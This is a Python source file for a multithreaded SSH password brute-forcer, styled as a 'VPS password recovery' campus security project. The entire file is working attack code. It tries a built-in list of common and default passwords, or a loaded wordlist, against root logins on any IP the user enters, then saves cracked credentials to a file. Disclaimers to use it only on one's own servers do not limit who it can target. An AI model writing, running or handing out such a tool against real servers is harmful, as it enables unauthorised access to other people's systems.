#!/usr/bin/env python3
"""
VPS SSH Password Recovery Tool
Campus Project - Educational Security Testing
WARNING: Use only on your own servers!
"""

import paramiko
import threading
import time
import queue
import sys
import os
from datetime import datetime
import socket

class VPSPasswordCracker:
    def __init__(self, target_ip, username='root', port=22, max_workers=10):
        self.target_ip = target_ip
        self.username = username
        self.port = port
        self.max_workers = max_workers
        
        # Threading
        self.password_queue = queue.Queue()
        self.found_password = None
        self.attempts = 0
        self.running = False
        self.lock = threading.Lock()
        
        # Stats
        self.start_time = None
        self.total_passwords = 0
    
    def print_banner(self):
        """Print tool banner"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██╗   ██╗██████╗ ███████╗    ███████╗███████╗██╗  ██╗    ║
║    ██║   ██║██╔══██╗██╔════╝    ██╔════╝██╔════╝██║  ██║    ║
║    ██║   ██║██████╔╝███████╗    ███████╗███████╗███████║    ║
║    ╚██╗ ██╔╝██╔═══╝ ╚════██║    ╚════██║╚════██║██╔══██║    ║
║     ╚████╔╝ ██║     ███████║    ███████║███████║██║  ██║    ║
║      ╚═══╝  ╚═╝     ╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝    ║
║                                                              ║
║            🔓 VPS PASSWORD RECOVERY TOOL 🔓                  ║
║                  Campus Security Project                     ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""
        print(banner)
    
    def check_ssh_connection(self, password):
        """Try SSH connection with password"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                hostname=self.target_ip,
                port=self.port,
                username=self.username,
                password=password,
                timeout=5,
                allow_agent=False,
                look_for_keys=False
            )
            
            ssh.close()
            return True
            
        except paramiko.AuthenticationException:
            return False
        except socket.timeout:
            print(f"⚠️  Connection timeout")
            return False
        except Exception as e:
            return False
    
    def worker_thread(self, worker_id):
        """Worker thread for password testing"""
        while self.running:
            try:
                password = self.password_queue.get(timeout=1)
                
                if password is None:  # Poison pill
                    break
                
                with self.lock:
                    self.attempts += 1
                    current_attempts = self.attempts
                
                # Try password
                if self.check_ssh_connection(password):
                    with self.lock:
                        if not self.found_password:
                            self.found_password = password
                            self.running = False
                            print(f"\n\n🎉 PASSWORD FOUND! 🎉")
                            print(f"✅ IP: {self.target_ip}")
                            print(f"✅ Username: {self.username}")
                            print(f"✅ Password: {password}")
                            print(f"✅ Attempts: {current_attempts}")
                else:
                    if current_attempts % 10 == 0:
                        elapsed = time.time() - self.start_time
                        rate = current_attempts / elapsed if elapsed > 0 else 0
                        print(f"\r🔍 Attempts: {current_attempts:,} | Rate: {rate:.1f}/s | Testing: {password[:20]}...", end="", flush=True)
                
                self.password_queue.task_done()
                
                # Small delay to avoid overwhelming server
                time.sleep(0.1)
                
            except queue.Empty:
                continue
            except Exception as e:
                print(f"\n❌ Worker-{worker_id} error: {e}")
    
    def generate_common_passwords(self):
        """Generate common password list"""
        passwords = [
            # Very common
            '123456', 'password', '12345678', 'qwerty', '123456789',
            'admin', 'letmein', 'welcome', '1234', 'admin123',
            'root', 'toor', 'pass', 'test', 'guest',
            
            # Common patterns
            'Password1', 'Password123', 'Admin123', 'Root123',
            'Qwerty123', 'Welcome123', 'Ubuntu123', 'Server123',
            
            # VPS common
            'vps123', 'server', 'changeme', 'password1', 'admin1',
            'root123', 'ubuntu', 'centos', 'debian', 'linux',
            
            # Variations
            'P@ssw0rd', 'P@ssword', 'Adm1n', 'R00t', 'L1nux',
            '1q2w3e4r', 'qwerty123', 'abc123', '1qaz2wsx',
            
            # Year-based
            'password2024', 'admin2024', 'password2023', 'admin2023',
            'password2025', 'admin2025',
            
            # Empty/simple
            '', ' ', '0000', '1111', '9999',
            
            # Default VPS
            'Digital0cean', 'Linode123', 'Vultr123', 'AWS123',
        ]
        
        return passwords
    
    def load_wordlist(self, filepath):
        """Load passwords from wordlist file"""
        passwords = []
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    password = line.strip()
                    if password:
                        passwords.append(password)
            
            print(f"✅ Loaded {len(passwords):,} passwords from {filepath}")
            
        except FileNotFoundError:
            print(f"❌ Wordlist file not found: {filepath}")
        except Exception as e:
            print(f"❌ Error loading wordlist: {e}")
        
        return passwords
    
    def create_default_wordlist(self):
        """Create default wordlist file"""
        filename = "vps_passwords.txt"
        
        passwords = self.generate_common_passwords()
        
        # Add more patterns
        for i in range(100):
            passwords.append(f"password{i}")
            passwords.append(f"admin{i}")
            passwords.append(f"root{i}")
        
        try:
            with open(filename, 'w') as f:
                for pwd in passwords:
                    f.write(pwd + '\n')
            
            print(f"✅ Created default wordlist: {filename} ({len(passwords):,} passwords)")
            return filename
            
        except Exception as e:
            print(f"❌ Error creating wordlist: {e}")
            return None
    
    def test_connection(self):
        """Test if SSH port is open"""
        print(f"🔍 Testing connection to {self.target_ip}:{self.port}...")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target_ip, self.port))
            sock.close()
            
            if result == 0:
                print(f"✅ SSH port {self.port} is open")
                return True
            else:
                print(f"❌ SSH port {self.port} is closed or filtered")
                return False
                
        except Exception as e:
            print(f"❌ Connection test failed: {e}")
            return False
    
    def start_attack(self, passwords):
        """Start password cracking attack"""
        self.print_banner()
        
        print(f"🎯 TARGET INFORMATION")
        print(f"─" * 50)
        print(f"IP Address:  {self.target_ip}")
        print(f"Port:        {self.port}")
        print(f"Username:    {self.username}")
        print(f"Passwords:   {len(passwords):,}")
        print(f"Workers:     {self.max_workers}")
        print()
        
        # Test connection
        if not self.test_connection():
            print("❌ Cannot connect to target. Aborting.")
            return False
        
        print(f"⚠️  WARNING: This will attempt SSH login {len(passwords):,} times!")
        print(f"⚠️  Use ONLY on your own servers for testing!")
        print()
        
        response = input("🚀 Start password cracking? (yes/no): ").strip().lower()
        if response != 'yes':
            print("❌ Attack cancelled")
            return False
        
        # Queue passwords
        self.total_passwords = len(passwords)
        for password in passwords:
            self.password_queue.put(password)
        
        # Start workers
        print(f"\n🚀 Starting {self.max_workers} worker threads...")
        self.running = True
        self.start_time = time.time()
        
        workers = []
        for i in range(self.max_workers):
            worker = threading.Thread(target=self.worker_thread, args=(i+1,), daemon=True)
            worker.start()
            workers.append(worker)
            time.sleep(0.1)
        
        print(f"✅ All workers started")
        print(f"\n🔍 Cracking in progress...\n")
        
        try:
            # Wait for completion
            self.password_queue.join()
            
            # Stop workers
            for _ in range(self.max_workers):
                self.password_queue.put(None)
            
            for worker in workers:
                worker.join(timeout=2)
            
        except KeyboardInterrupt:
            print("\n\n⏹️  Attack stopped by user")
            self.running = False
        
        # Results
        elapsed = time.time() - self.start_time
        
        print(f"\n\n📊 ATTACK SUMMARY")
        print(f"─" * 50)
        print(f"Total Attempts:    {self.attempts:,}/{self.total_passwords:,}")
        print(f"Time Elapsed:      {elapsed:.1f} seconds")
        print(f"Average Rate:      {self.attempts/elapsed:.1f} attempts/second")
        
        if self.found_password:
            print(f"\n✅ SUCCESS!")
            print(f"Password Found:    {self.found_password}")
            
            # Save to file
            self.save_credentials()
            return True
        else:
            print(f"\n❌ Password not found in wordlist")
            print(f"💡 Try a larger wordlist or different username")
            return False
    
    def save_credentials(self):
        """Save found credentials to file"""
        filename = f"found_credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        try:
            with open(filename, 'w') as f:
                f.write(f"VPS SSH Credentials\n")
                f.write(f"="*50 + "\n\n")
                f.write(f"IP Address: {self.target_ip}\n")
                f.write(f"Port:       {self.port}\n")
                f.write(f"Username:   {self.username}\n")
                f.write(f"Password:   {self.found_password}\n")
                f.write(f"\nFound at:   {datetime.now()}\n")
                f.write(f"Attempts:   {self.attempts}\n")
            
            print(f"\n💾 Credentials saved to: {filename}")
            
        except Exception as e:
            print(f"❌ Error saving credentials: {e}")

def main():
    """Main function"""
    print("🔓 VPS SSH PASSWORD CRACKER")
    print("=" * 50)
    print()
    
    # Get target info
    target_ip = input("🎯 Enter VPS IP address: ").strip()
    if not target_ip:
        print("❌ IP address required")
        return
    
    username = input("👤 Enter username [root]: ").strip() or "root"
    port = input("🔌 Enter SSH port [22]: ").strip() or "22"
    
    try:
        port = int(port)
    except:
        print("❌ Invalid port number")
        return
    
    # Wordlist selection
    print(f"\n📝 WORDLIST OPTIONS")
    print("1. Use default common passwords")
    print("2. Load custom wordlist file")
    print("3. Create new wordlist file")
    
    choice = input("Select option (1-3): ").strip()
    
    cracker = VPSPasswordCracker(target_ip, username, port, max_workers=5)
    
    passwords = []
    
    if choice == "1":
        passwords = cracker.generate_common_passwords()
        print(f"✅ Using {len(passwords)} common passwords")
        
    elif choice == "2":
        wordlist_path = input("Enter wordlist file path: ").strip()
        passwords = cracker.load_wordlist(wordlist_path)
        
        if not passwords:
            print("⚠️  Falling back to common passwords")
            passwords = cracker.generate_common_passwords()
            
    elif choice == "3":
        wordlist_file = cracker.create_default_wordlist()
        if wordlist_file:
            passwords = cracker.load_wordlist(wordlist_file)
    
    if not passwords:
        print("❌ No passwords to test")
        return
    
    # Start attack
    cracker.start_attack(passwords)
    
    print("\n🏁 Tool execution completed")
    input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        # Check if paramiko is installed
        import paramiko
        main()
    except ImportError:
        print("❌ Required module 'paramiko' not installed")
        print("Install with: pip install paramiko")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n\n⏹️  Program interrupted")
    except Exception as e:
        print(f"\n💥 Error: {e}")
